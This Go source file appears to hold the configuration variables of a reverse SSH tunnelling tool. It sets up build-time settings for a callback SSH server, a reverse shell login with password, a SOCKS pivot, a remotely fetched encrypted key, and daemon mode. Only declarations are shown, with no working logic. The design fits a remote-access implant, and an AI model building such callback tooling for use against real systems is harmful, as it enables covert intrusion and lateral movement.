package main

import "sync"

// Global vars
var connections = new(sync.WaitGroup)

// LD_FLAGS' modifiable constants
var (
	SSHServerHost string //SSHServer host
	SSHServerPort string //SSHServer port
	SSHServerUser string //SSHServer user, logging in to SSHServer SSH

	SSHRemoteCmdHost string //SSHRemote host
	SSHRemoteCmdPort string //SSHRemote port
	SSHRemoteCmdUser string //user logging in on reverse SSH shell, addt'l control
	SSHRemoteCmdPwd  string //pw for the ^^ user

	localHost string //local host
	localPort string //local port

	SSHShell           string // Default Shell
	SSHRemoteSocksHost string //SOCKS host
	SSHRemoteSocksPort string //SOCKS port

	SSHServerUserKey           string // Encrypted RSA key for SSH tunnel. Embedded unwrap
	SSHServerUserKeyUrl        string // Where encrypted RSA key for SSH tunnel lives. Remote unwrap
	SSHServerUserKeyPassphrase string // decryption key for ^^

	HTTPProxy                           string // HTTP Proxy
	HTTPProxyFromEnvironment            string // HTTP Proxy
	HTTPProxyAuthUser    string // HTTP Proxy User
	HTTPProxyAuthPass    string // HTTP Proxy Pass
	HTTPEndpoint         string // HTTP Endpoint
	WSEndpoint           string // WS/S Endpoint

	LogFile    string
	Daemonize  string
	PIDFile    string
)

// local service to be forwarded
var localEndpoint = Endpoint{
	Host: localHost,
	Port: localPort,
}

// SSHRemote SSH SSHServer
var SSHServerEndpoint = Endpoint{
	Host: SSHServerHost, //"192.168.88.15",
	Port: SSHServerPort,
}

// SSHRemote reverse forwarding port for shell (on SSHRemote SSH SSHServer network)
var SSHRemoteEndpoint = Endpoint{
	Host: SSHRemoteCmdHost,
	Port: SSHRemoteCmdPort,
}

// SSHRemote reverse forwarding port for SOCKS (on SSHRemote SSH SSHServer network)
var SSHRemoteEndpointSOCKS = Endpoint{
	Host: SSHRemoteSocksHost,
	Port: SSHRemoteSocksPort,
}
